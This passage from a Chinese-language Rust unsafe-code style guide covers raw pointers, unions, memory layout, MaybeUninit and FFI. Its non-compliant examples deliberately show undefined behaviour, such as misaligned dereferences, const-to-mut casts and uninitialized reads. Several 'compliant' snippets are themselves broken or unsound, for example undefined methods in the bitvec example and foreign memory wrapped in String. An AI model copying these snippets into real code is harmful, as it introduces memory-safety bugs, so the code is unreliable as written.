</span>    // 符合
	pub fn split_at_mut(&amp;mut self, mid: usize) -&gt; (&amp;mut [T], &amp;mut [T]) {
        assert!(mid &lt;= self.len()); // 判断边界条件，杜绝非法参数
        // SAFETY: `[ptr; mid]` and `[mid; len]` are inside `self`, which
        // fulfills the requirements of `from_raw_parts_mut`.
        unsafe { self.split_at_mut_unchecked(mid) }
    }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>默认 level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/index.html#debug_assert_with_mut_call">debug_assert_with_mut_call</a></td><td>yes</td><td>no</td><td>nursery</td><td>allow</td></tr>
</tbody></table>
<p>注意该 lint 当前是 Nursery Group，意味着可能会产生误报 Bug。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="裸指针操作"><a class="header" href="#裸指针操作">裸指针操作</a></h1>
<p>Rust提供了<code>*const T</code>（不变）和<code>*mut T</code>（可变）两种指针类型。因为这两种指针和C语言中的指针十分相近，所以叫其原生指针（Raw Pointer）。</p>
<p>原生指针具有以下特点：</p>
<ul>
<li>并不保证指向合法的内存。比如很可能是一个空指针。</li>
<li>不能像智能指针那样自动清理内存。需要像 C 语言那样手动管理内存。</li>
<li>没有生命周期的概念，也就是说，编译器不会对其提供借用检查。</li>
<li>不能保证线程安全。</li>
</ul>
<p>可见，原生指针并不受Safe Rust提供的那一层“安全外衣”保护，所以也被称为“裸指针”。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsptr01--不要将裸指针在多线程间共享"><a class="header" href="#punsptr01--不要将裸指针在多线程间共享">P.UNS.PTR.01  不要将裸指针在多线程间共享</a></h2>
<p><strong>【描述】</strong></p>
<p>裸指针在 Rust 中不是线程安全的，将裸指针在多线程传递编译器也会编译出错。如果需要在多线程间共享裸指针，则考虑使用 <code>NewType</code> 模式来包装它。</p>
<p>【正例】</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct MyBox(*mut u8);

unsafe impl Send for MyBox {}
unsafe impl Sync for MyBox {}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsptr02--建议使用-nonnullt-来替代-mut-t"><a class="header" href="#punsptr02--建议使用-nonnullt-来替代-mut-t">P.UNS.PTR.02  建议使用 <code>NonNull&lt;T&gt;</code> 来替代 <code>*mut T</code></a></h2>
<p><strong>【描述】</strong></p>
<p>尽量使用 <a href="https://doc.rust-lang.org/stable/std/ptr/struct.NonNull.html"><code>NonNull</code></a> 来包装 <code>*mut T</code>。</p>
<p><code>NonNull</code> 的优势：</p>
<ol>
<li>非空指针。会自动检查包装的指针是否为空。</li>
<li>协变。方便安全抽象。如果用裸指针，则需要配合 <code>PhantomData</code>类型来保证协变。</li>
</ol>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::ptr::NonNull;

let mut x = 0u32;
let ptr = NonNull::&lt;u32&gt;::new(&amp;mut x as *mut _).expect(&quot;ptr is null!&quot;);

if let Some(ptr) = NonNull::&lt;u32&gt;::new(std::ptr::null_mut()) {
    unreachable!();
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsptr03--使用指针类型构造泛型结构体时需要使用-phantomdatat-来指定-t上的协变和所有权"><a class="header" href="#punsptr03--使用指针类型构造泛型结构体时需要使用-phantomdatat-来指定-t上的协变和所有权">P.UNS.PTR.03  使用指针类型构造泛型结构体时，需要使用 <code>PhantomData&lt;T&gt;</code> 来指定 <code>T</code>上的协变和所有权</a></h2>
<p><strong>【描述】</strong></p>
<p><code>PhantomData&lt;T&gt;</code> 是经常被用于 Unsafe Rust 中配合裸指针来指定协变和所有权的，为裸指针构建的类型保证安全性和有效性。否则，可能会产生未定义行为。</p>
<p>参考： <a href="https://doc.rust-lang.org/nomicon/phantom-data.html"><code>PhantomData&lt;T&gt;</code>  的型变（variance）模式表</a> </p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Vec&lt;T&gt; 不拥有类型 T，并且 data 字段的裸指针不支持协变
// 这样的话，是有风险的。
// 为 Vec&lt;T&gt; 实现的 Drop 可能导致 UB
struct Vec&lt;T&gt; {
    data: *const T, 
    len: usize,
    cap: usize,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::marker;

struct Vec&lt;T&gt; {
    data: *const T, // *const for variance!
    len: usize,
    cap: usize,
    _marker: marker::PhantomData&lt;T&gt;, // 让 Vec&lt;T&gt; 拥有 T，并且让 指针有了协变
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gunsptr01--当指针类型被强转为和当前内存对齐不一致的指针类型时禁止对其解引用"><a class="header" href="#gunsptr01--当指针类型被强转为和当前内存对齐不一致的指针类型时禁止对其解引用">G.UNS.PTR.01  当指针类型被强转为和当前内存对齐不一致的指针类型时，禁止对其解引用</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>对于指针类型被强转为和当前内存对齐不一致的指针类型的情况，要注意不要对这类强转后的指针进行解引用操作，否则会有未定义行为。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let a = (&amp;1u8 as *const u8) as *const u16; // 不符合
    let b = (&amp;mut 1u8 as *mut u8) as *mut u16; // 不符合

    let c =  (&amp;1u8 as *const u8).cast::&lt;u16&gt;(); // 不符合

    
    // Undefined Behavior: dereferencing pointer failed: alloc1411 has size 1, so pointer to 2 bytes starting at offset 0 is out-of-bounds
    unsafe { *a }; 
    // Undefined Behavior: dereferencing pointer failed: alloc1411 has size 1, so pointer to 2 bytes starting at offset 0 is out-of-bounds
    unsafe { *b }; 
    // Undefined Behavior: dereferencing pointer failed: alloc1411 has size 1, so pointer to 2 bytes starting at offset 0 is out-of-bounds
    unsafe { *c }; 
}

</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let a = (&amp;1u8 as *const u8) as *const u8; // 符合
    let b = (&amp;mut 1u8 as *mut u8) as *mut u8; // 符合

    let c =  (&amp;1u8 as *const u8).cast::&lt;u8&gt;(); // 符合
   
    
    // safe
    unsafe { *a }; 
    // safe
    unsafe { *b }; 
    // safe
    unsafe { *c }; 
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_ptr_alignment">cast_ptr_alignment</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gunsptr02--禁止将不可变指针手工转换为可变指针"><a class="header" href="#gunsptr02--禁止将不可变指针手工转换为可变指针">G.UNS.PTR.02  禁止将不可变指针手工转换为可变指针</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>因为将不可变指针手工转换为可变指针可能会引发未定义行为。通常有这种需求，合法的手段是使用 <code>UnsafeCell&lt;T&gt;</code>。</p>
<p><strong>【 反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn x(r: &amp;i32) {
    unsafe {
        *(r as *const _ as *mut _) += 1; // 不符合
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::cell::UnsafeCell;

// 符合
fn x(r: &amp;UnsafeCell&lt;i32&gt;) {
   unsafe {
       *r.get() += 1; 
   }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>也有例外情况，当明确知道这种转换会出现什么风险的时候，可以使用，或者在找到合适的解决办法之前 作为一种临时方案，但要加上注释。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// https://docs.rs/crate/solana-runtime/1.7.11/source/src/append_vec.rs
#[allow(clippy::cast_ref_to_mut)]
fn set_data_len_unsafe(&amp;self, new_data_len: u64) {
    // UNSAFE: cast away &amp; (= const ref) to &amp;mut to force to mutate append-only (=read-only) AppendVec
    unsafe {
        *(&amp;self.meta.data_len as *const u64 as *mut u64) = new_data_len;
    }
}

// https://docs.rs/crate/mmtk/0.6.0/source/src/policy/space.rs
// This is a temporary solution to allow unsafe mut reference. We do not want several occurrence
// of the same unsafe code.
// FIXME: We need a safe implementation.
#[allow(clippy::cast_ref_to_mut)]
#[allow(clippy::mut_from_ref)]
unsafe fn mut_self(&amp;self) -&gt; &amp;mut Self {
    &amp;mut *(self as *const _ as *mut _)
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="lint-检测-3"><a class="header" href="#lint-检测-3">【Lint 检测】</a></h3>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cast_ref_to_mut">cast_ref_to_mut</a></td><td>yes</td><td>no</td><td><strong>correctness</strong></td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gunsptr03--尽量使用-pointercast-来代替-使用-as-强转指针"><a class="header" href="#gunsptr03--尽量使用-pointercast-来代替-使用-as-强转指针">G.UNS.PTR.03  尽量使用 <code>pointer::cast</code> 来代替 使用 <code>as</code> 强转指针</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>使用 <code>pointer::cast</code> 方法转换更加安全，它不会意外地改变指针的可变性，也不会将指针转换为其他类型。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let ptr: *const u32 = &amp;42_u32;
let mut_ptr: *mut u32 = &amp;mut 42_u32;
let _ = ptr as *const i32; // 不符合
let _ = mut_ptr as *mut i32; // 不符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let ptr: *const u32 = &amp;42_u32;
let mut_ptr: *mut u32 = &amp;mut 42_u32;
let _ = ptr.cast::&lt;i32&gt;(); // 符合
let _ = mut_ptr.cast::&lt;i32&gt;(); // 符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#ptr_as_ptr">ptr_as_ptr</a></td><td>yes</td><td>no</td><td><strong>correctness</strong></td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="联合体union"><a class="header" href="#联合体union">联合体（Union）</a></h1>
<p>Union 是没有 tag 的 Enum，Enum 是有 tag 的Union 。</p>
<p>内存布局 Union 和 Enum 相似。</p>
<p>正因为没有 tag，Rust 编译器无法检查当前使用的正是哪个变体，所以，访问 Union 的变体是 Unsafe 的。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsuni01--除了与-c-交互尽量不要使用-union"><a class="header" href="#punsuni01--除了与-c-交互尽量不要使用-union">P.UNS.UNI.01  除了与 C 交互，尽量不要使用 Union</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 支持 Union 就是为了调用 C 接口。如果不是 FFi ，就避免使用 Union。</p>
<p>一般情况下请使用 枚举 或 结构体代替。</p>
<p>使用 Copy 类型的值和 <code>ManuallyDrop</code> 来初始化 Union 的变体，不需要使用 Unsafe 块。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>union MyUnion {
    f1: u32,
    f2: f32,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[repr(C)]
union MyUnion {
    f1: u32,
    f2: f32,
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsuni02--不要把联合体的不同变体用在不同生命周期内"><a class="header" href="#punsuni02--不要把联合体的不同变体用在不同生命周期内">P.UNS.UNI.02  不要把联合体的不同变体用在不同生命周期内</a></h2>
<p><strong>【描述】</strong></p>
<p>对联合体的变体进行借用的时候，要注意其他变体也将在同一个生命周期内。抛开内存布局、安全性和所有权之外，联合体的行为和结构体完全一致，你可以将联合体当做结构体来进行判断。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// ERROR: cannot borrow `u` (via `u.f2`) as mutable more than once at a time
fn test() {
    let mut u = MyUnion { f1: 1 };
    unsafe {
        let b1 = &amp;mut u.f1;
//                    ---- first mutable borrow occurs here (via `u.f1`)
        let b2 = &amp;mut u.f2;
//                    ^^^^ second mutable borrow occurs here (via `u.f2`)
        *b1 = 5;
    }
//  - first borrow ends here
    assert_eq!(unsafe { u.f1 }, 5);
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="内存"><a class="header" href="#内存">内存</a></h1>
<p>这里指 Unsafe Rust 下的数据布局、内存管理和使用相关规范。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsmem01--要注意选择合适的结构体元组枚举的数据布局"><a class="header" href="#punsmem01--要注意选择合适的结构体元组枚举的数据布局">P.UNS.MEM.01  要注意选择合适的结构体、元组、枚举的数据布局</a></h2>
<p><strong>【描述】</strong></p>
<p>对于 Rust 中结构体和元组，编译器会随意重排其字段来优化布局。请根据具体的场景来选择合适的数据布局。</p>
<p>可以通过以下 <code>#[repr]</code> 属性来控制结构体和元组的数据布局：</p>
<ul>
<li><code>#[repr(Rust)]</code> ，默认 Rust 数据布局</li>
<li><code>#[repr(C)]</code> ，与 C 兼容的布局</li>
<li><code>#[repr(align(N))]</code> ，指定对齐方式</li>
<li><code>#[repr(packed)]</code> ，指定字段将不在内部对齐</li>
<li><code>#[repr(transparent)]</code> ，让包含单个字段的结构体布局和其字段相同</li>
</ul>
<p>可以通过以下 <code>#[repr]</code> 属性来控制枚举体的数据布局：</p>
<ul>
<li>特定整数类型
<ul>
<li><code>#[repr(u8)]</code></li>
<li><code>#[repr(u16)]</code></li>
<li><code>#[repr(u32)]</code></li>
<li><code>#[repr(u64)]</code></li>
<li><code>#[repr(i8)]</code></li>
<li><code>#[repr(i16)]</code></li>
<li><code>#[repr(i32)]</code></li>
<li><code>#[repr(i64)]</code></li>
</ul>
</li>
<li>C 兼容布局
<ul>
<li><code>#[repr(C)]</code></li>
</ul>
</li>
<li>指定判别式大小的 C 兼容布局
<ul>
<li><code>#[repr(C, u8)]</code></li>
<li><code>#[repr(C, u16)]</code></li>
<li>以此类推</li>
</ul>
</li>
</ul>
<p>枚举需要注意的地方：</p>
<ul>
<li>枚举不允许通过 <code>#[repr(align)]</code> 手动指定对齐方式。</li>
<li>空枚举不能使用 <code>repr</code> 属性</li>
<li>无字段枚举不允许指定判别式大小的 C 兼容布局，比如 <code>[repr(C, Int)]</code></li>
<li>数据承载（有字段）枚举则允许所有类型的 <code>repr</code> 属性</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsmem02--不能修改其它进程或动态库的内存变量"><a class="header" href="#punsmem02--不能修改其它进程或动态库的内存变量">P.UNS.MEM.02  不能修改其它进程或动态库的内存变量</a></h2>
<p><strong>【描述】</strong></p>
<p>除非调用合法的API，否则不要尝试修改其它进程/动态库的内存数据，否则会出现内存段错误(SIGSEGV)。</p>
<p><strong>【反例】</strong></p>
<p><code>sqlite3_libversion()</code> 返回的 sqlite 版本信息指针指向 <code>/usr/lib/libsqlite3.so</code> 动态库的 static 字符串。</p>
<p>libsqlite3.so 中分配的静态字符串不属于进程的内存范围中。</p>
<p>当进程尝试修改 sqlite 动态库的静态字符串内容，操作系统就会发送 SIGSEGV 信号终止进程，以保证 sqlite 动态库的内存数据安全。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[link(name = &quot;sqlite3&quot;)]
extern &quot;C&quot; {
    fn sqlite3_libversion() -&gt; *mut std::os::raw::c_char;
}

fn edit_sqlite_version() {
    unsafe {
        let mut sqlite_version = sqlite3_libversion();
        // SIGSEGV: invalid memory reference
        *sqlite_version = 3;
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsmem03--不能让-stringvec-自动-drop-其它进程或动态库的内存数据"><a class="header" href="#punsmem03--不能让-stringvec-自动-drop-其它进程或动态库的内存数据">P.UNS.MEM.03  不能让 <code>String/Vec</code> 自动 Drop 其它进程或动态库的内存数据</a></h2>
<p><strong>【描述】</strong></p>
<p>使用 <code>String/Vec</code> 指向其它进程/动态库的内存数据时，一定要手动禁止 <code>String/Vec</code> 的 Drop 方法(析构函数)的调用，避免 free 其它进程/动态库的内存数据。</p>
<p><strong>【反例】</strong></p>
<p><code>sqlite3_libversion()</code> 返回的 sqlite 版本信息指针指向 <code>/usr/lib/libsqlite3.so</code> 动态库的 static 字符串。</p>
<p>当进程在 <code>String</code> drop 的时候尝试释放 sqlite 动态库的静态字符串内存时，操作系统就会发送 SIGABRT 信号终止进程，以保证 sqlite 动态库的内存数据安全。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[link(name = &quot;sqlite3&quot;)]
extern &quot;C&quot; {
    fn sqlite3_libversion() -&gt; *mut std::os::raw::c_char;
}

fn print_sqlite_version() {
    unsafe {
        let ptr = sqlite3_libversion();
        let len = libc::strlen(ptr);
        let version = String::from_raw_parts(ptr.cast(), len, len);
        println!(&quot;found sqlite3 version={}&quot;, version);
        // SIGABRT: invalid free
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>除了用 <code>mem::forget</code> 或者 <code>ManualDrop</code> 禁止 <code>String</code> drop 其它动态库的内存，也可以用标准库 <code>ptr/slice</code> 的 <code>copy</code> 或者 <code>libc::strdup</code> 将 sqlite 的版本信息字符串<strong>复制到当前进程的内存空间</strong>再进行操作</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn print_sqlite_version() {
    unsafe {
        let ptr = sqlite3_libversion();
        let len = libc::strlen(ptr);
        let version = String::from_raw_parts(ptr.cast(), len, len);
        println!(&quot;found sqlite3 version={}&quot;, version);
        // 手动禁止 String 的析构函数调用
        std::mem::forget(version);
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsmem04--尽量用可重入reentrant版本的-c-api-或系统调用"><a class="header" href="#punsmem04--尽量用可重入reentrant版本的-c-api-或系统调用">P.UNS.MEM.04  尽量用可重入(reentrant)版本的 C-API 或系统调用</a></h2>
<p><strong>【描述】</strong></p>
<p>以 Linux 系统为例，在 <strong>glibc</strong>(/usr/lib/libc.so) 等知名 C 语言库中，很多 API 会既提供不可重入版本和**可重入(reentrant)**版本，例如 ctime 和 ctime_r 这对系统调用。可重入版本的函数命名一般带 <strong>_r</strong> 的后缀，<em>_r</em> 也就是单词可重入 reentrant 的缩写。</p>
<blockquote>
<p>libc 中不可重入函数的执行过程一般是将函数的输出写到动态库的某个 static 命令内，然后再返回指向该 static 变量的指针返回给调用方，因此是一种「有状态」的函数，多线程环境下可能有<strong>线程安全问题</strong>。</p>
</blockquote>
<p>使用不可重入函数的风险会导致开发人员带来很大的心智负担，需要耗费人力进行代码安全评审确保没有线程安全和内存安全问题，因此必须尽量使用可重入版本的函数。</p>
<p><strong>【反例】</strong></p>
<p><code>ctime</code>, <code>gmtime</code>,<code> localtime</code>, <code>gethostbyname</code></p>
<p><strong>【正例】</strong></p>
<p><code>chrono</code> 库中用 <code>libc::localtime_r</code> 获取本地时间而不用 <code>libc::localtime</code>。</p>
<p>还有诸如 <code>ctime_r</code>, <code>gmtime_r</code>,<code> localtime_r</code>, <code>gethostbyname_r</code>等。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsmem05--如果需要使用位域推荐使用第三方库"><a class="header" href="#punsmem05--如果需要使用位域推荐使用第三方库">P.UNS.MEM.05  如果需要使用位域，推荐使用第三方库</a></h2>
<p><strong>【描述】</strong></p>
<p>位域（或称“位段”， Bit field）为一种数据结构，可以把数据以位的形式紧凑的存储，并允许程序员对此结构的位进行寻址和操作。</p>
<p>这种数据结构的好处：</p>
<ul>
<li>可以使数据单元节省存储空间，当程序需要成千上万个数据单元时，这种方法就显得尤为重要。</li>
<li>位域可以很方便的访问一个整数值的部分内容从而可以简化程序源代码。</li>
</ul>
<p>而位域这种数据结构的缺点在于，其内存分配与内存对齐的实现方式依赖于具体的机器和系统，在不同的平台可能有不同的结果，这导致了位域在本质上是不可移植的。所以目前 Rust 并未在语言内置位域支持。</p>
<p>Rust 中使用位域时推荐使用的第三方库：</p>
<ul>
<li><a href="https://github.com/bitvecto-rs/bitvec">bitvec</a>，是 Cpp 中 <code>std::vector&lt;bool&gt;</code>和<code>std::bitset</code> 数据结构的 Rust 实现。
在性能、功能性、API完整性和表现力方面，该库都非常优秀。</li>
<li><a href="https://github.com/bitflags/bitflags">bitflags</a>，提供了方便的宏语法来定义和处理位域。</li>
<li><a href="https://github.com/Robbepop/modular-bitfield">modular-bitfield</a>，提供了一些宏来定义和处理位域，并且是完全基于 Safe Rust。</li>
</ul>
<p>以上三个库都支持 <code>no-std</code>。</p>
<p><strong>【正例】</strong></p>
<p>以 <code>bitvec</code> 为例。 示例参考：<a href="https://myrrlyn.net/blog/misc/bitfields-in-rust">https://myrrlyn.net/blog/misc/bitfields-in-rust</a></p>
<p>C 语言中定义位域。</p>
<pre><code class="language-C">Struct SixFlags {
  uint16_t eins : 3;
  uint16_t zwei : 2;
  uint16_t drei : 3;
  uint16_t vier : 3;
  uint16_t funf : 2;
  uint16_t seid : 3;
}
</code></pre>
<pre><pre class="playground"><code class="language-rust">type SixFlagsBits = BitSlice&lt;Local, u16&gt;;

#[repr(C)]
#[derive(Copy, Clone, Default)]
pub struct SixFlags {
  inner: u16,
};

impl SixFlags {
  pub fn eins(&amp;self) -&gt; &amp;SixFlagsBits {
    &amp;self.inner.bits()[0 .. 3]
  }

  pub fn eins_mut(&amp;mut self) -&gt; &amp;mut SixFlagsBits {
    &amp;mut self.inner.bits()[0 .. 3]
  }

  pub fn zwei(&amp;self) -&gt; &amp;SixFlagsBits {
    &amp;self.inner.bits()[3 .. 5]
  }

  pub fn zwei_mut(&amp;mut self) -&gt; &amp;mut SixFlagsBits {
    &amp;mut self.inner.bits()[3 .. 5]
  }
}

fn main() {
    let mut flags = SixFlags::default();
    flags.eins_mut().store(2u8);
    flags.zwei_mut().store(0u8);
    flags.drei_mut().store(4u8);
    flags.vier_mut().store(5u8);
    flags.funf_mut().store(1u8);
    flags.seis_mut().store(7u8); 
}






</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gunsmem01---使用-maybeuninitt-来处理未初始化的内存"><a class="header" href="#gunsmem01---使用-maybeuninitt-来处理未初始化的内存">G.UNS.MEM.01   使用 <code>MaybeUninit&lt;T&gt;</code> 来处理未初始化的内存</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>Rust 编译器要求变量要根据其类型正确初始化。</p>
<p>比如引用类型的变量必须对齐且非空。这是一个必须始终坚持的不变量，即使在 Unsafe 代码中也是如此。因此，零初始化引用类型的变量会导致立即未定义行为，无论该引用是否访问过内存。</p>
<p>编译器利用这一点，进行各种优化，并且可以省略运行时检查。</p>
<p>使用前请仔细查看 <code>MaybeUninit&lt;T&gt;</code> 相关文档。</p>
<p><strong>【反例】</strong></p>
<p>由调用者来保证<code>MaybeUninit&lt;T&gt;</code>确实处于初始化状态。当内存尚未完全初始化时调用 <code>assume_init()</code> 会导致立即未定义的行为。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>use std::mem::{self, MaybeUninit};
// 不符合：零初始化引用
let x: &amp;i32 = unsafe { mem::zeroed() }; // undefined behavior! ⚠️
// 等价于 `MaybeUninit&lt;&amp;i32&gt;`:
let x: &amp;i32 = unsafe { MaybeUninit::zeroed().assume_init() }; // undefined behavior! 
// 不符合：布尔值必须初始化
let b: bool = unsafe { mem::uninitialized() }; // undefined behavior! ⚠️
// 等价于 `MaybeUninit&lt;bool&gt;`:
let b: bool = unsafe { MaybeUninit::uninit().assume_init() }; // undefined behavior! 
// 不符合：整数类型也必须初始化
let x: i32 = unsafe { mem::uninitialized() }; // undefined behavior! ⚠️
// 等价于 `MaybeUninit&lt;i32&gt;`:
let x: i32 = unsafe { MaybeUninit::uninit().assume_init() }; 

// 不符合：Vec未初始化内存使用 set_len 是未定义行为
let mut vec: Vec&lt;u8&gt; = Vec::with_capacity(1000);
unsafe { vec.set_len(1000); }
reader.read(&amp;mut vec); // undefined behavior!
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::mem::MaybeUninit;

let mut x = MaybeUninit::&lt;bool&gt;::uninit();
x.write(true); // 符合：这里正确进行了初始化
let x_init = unsafe { x.assume_init() }; // 通过 assume_init 对 MaybeUninit 的内存取值
assert_eq!(x_init, true);

// 符合：下面数组应该是可以的
let _: [MaybeUninit&lt;bool&gt;; 5] = unsafe {
    MaybeUninit::uninit().assume_init()
};

// 符合：Vec 未初始化内存正确处理
let mut vec: Vec&lt;u8&gt; = vec![0; 1000];
reader.read(&amp;mut vec);
// 符合
let mut vec: Vec&lt;MaybeUninit&lt;T&gt;&gt; = Vec::with_capacity(1000);
vec.set_len(1000);  // `MaybeUninit` can be uninitialized
// 符合：
let mut vec: Vec&lt;u8&gt; = Vec::with_capacity(1000);
let remaining = vec.spare_capacity_mut();  // `&amp;mut [MaybeUninit&lt;u8&gt;]`
// perform initialization with `remaining`
vec.set_len(...);  // Safe to call `set_len()` on initialized part
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>在能保证<code> MaybeUninit</code> 不需要初始化的情况下使用 <code>assume_init</code> 是安全的。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub unsafe trait Array: Sized {
  
    /// Same array but item is wrapped with
    /// [`MaybeUninit&lt;_&gt;`](core::mem::MaybeUninit).
    /// ```
    /// # use arraylib::Array; fn dummy&lt;T&gt;() where
    /// [T; 4]: Array&lt;Item = T, Maybe = [core::mem::MaybeUninit&lt;T&gt;; 4]&gt;
    /// # {}
    /// ```
    type Maybe: Array&lt;Item = MaybeUninit&lt;Self::Item&gt;&gt;;

    /// [`MaybeUninit&lt;T&gt;`]: core::mem::MaybeUninit
    #[inline]
    // Initializing generic type with uninitialized state seems insane, but is
    // unsafe trait and `Array` guarantees that it's an array. And `Array::Maybe`
    // is an array of `MaybeUninit` that doesn't require initialization, so
    // everything is ok
    // 这里是一个数组，可以保证不需要去初始化
    #[allow(clippy::uninit_assumed_init)]
    fn uninit() -&gt; Self::Maybe {
        unsafe {
            // ## Safety
            //
            // Completely safe as `MaybeUninit` don't require initialization
            MaybeUninit::uninit().assume_init()
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#uninit_assumed_init">uninit_assumed_init</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#uninit_vec">uninit_vec</a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ffi-规范"><a class="header" href="#ffi-规范">FFi 规范</a></h1>
<p>Rust 可以通过C-ABI无缝与C语言打交道，也可以通过暴露 C-ABI 接口供其他语言调用。但是跨边界本质上是不安全的。</p>
<p>一般来说，FFi 是指在其他语言中调用 Rust 代码，Rust代码会按 C-ABI 来暴露接口。这类 Rust crate或模块，常以 <code>-ffi</code>后缀结尾。</p>
<p>另一类是 Rust 去调用 C-ABI 接口，相关代码通常被封装到以 <code>-sys</code> 为后缀命名的 crate 或 模块中。 </p>
<p>本小节内容，包含以上两种情况。</p>
